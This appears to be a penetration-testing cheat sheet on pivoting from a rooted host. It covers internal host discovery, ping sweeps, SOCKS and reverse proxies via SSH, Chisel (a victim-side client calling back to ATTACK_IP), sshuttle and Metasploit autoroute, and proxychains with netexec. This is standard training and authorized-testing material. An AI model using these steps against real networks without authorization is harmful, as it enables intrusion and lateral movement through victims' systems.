# Network Pivoting Methodology

## 1) Internal Host Discovery

### In a network, if you root a machine, do these checks:

## Windows

Info about interfaces

    ipconfig /all

Print available routes

    route print

Known hosts on the routing table

    arp -a

Opened ports/services/connections running on the machine

    netstat -ano

DNS Entries

    type C:\WINDOWS\System32\drivers\etc\hosts


And

    ipconfig /displaydns | findstr "Record" | findstr "Name Host"

Ping Sweep Script (You might have to do some guesswork on the subnet we want to discover if we did not find any data)

    (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"

#### Linux

Info about interfaces

    ip a

    ifconfig

Known hosts on the routing table

    arp -a

Opened ports/services/connections running on the machine

    netstat -ano

DNS Entries

    cat /etc/hosts

    cat /etc/resolv.conf

Ping Sweep Script (You might have to do some guesswork on the subnet we want to discover if we did not find any data)

    for i in {1..255};do (ping -c 1 172.16.2.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done

### 2) SOCKS Proxy setup

Create reverse proxies to route traffic inside the internal network.

Some tools you can use to do it

1) SSH Dynamic Proxy (Authenticated)

       ssh -D 1080 user@IP
       ssh -D 1080 user@IP -i id_rsa

2) Chisel

#### Attacker machine

        chisel server -p 12345 --reverse

#### Victim rooted machine

        chiseil client ATTACK_IP:12345 R:0.0.0.0:1080:socks 

3) sshuttle (Authenticated)

        sshuttle -r USER@IP subnet

Use the IP machine as a jumpbox to connect to the specific TARGET_IP machine

       sshuttle -r USER@IP TARGET_IP

Key based authentication

        sshuttle -r USER@IP --ssh-cmd "ssh -i id_rsa"  -x COMPROMISED_TARGET_IP subnet

4) Metasploit

Route traffic 

        route add IP SUBNET 

Port forwarding

        portfwd all -l PORT -p PORT -r IP

Autoroute using meterpreter

        run autoroute -s TARGET_SUBNET/MASK

Proxy setup

        use auxiliary/server/socks5

        set SRVHOST 127.0.0.1

        exploit

### 3) Run tools from your attacking machine to internal network

Run any tool you want via proxychains using your setup proxy.

Setup the apropriate type of proxy and port in the master config file of proxychains

        sudo nano /etc/proxychains.conf

If you want to use more proxies, just copy the master config file and change the appropriate values to the corresponding port number

        sudo cp /etc/proxychains.conf .

Now you are ready to pivot within the internal network

#### Example

        proxychains -q netexec smb INTERNAL_SUBNET

OR

        proxychains -q -f ./proxychains_1088.conf netexec smb INTERNAL_SUBNET2

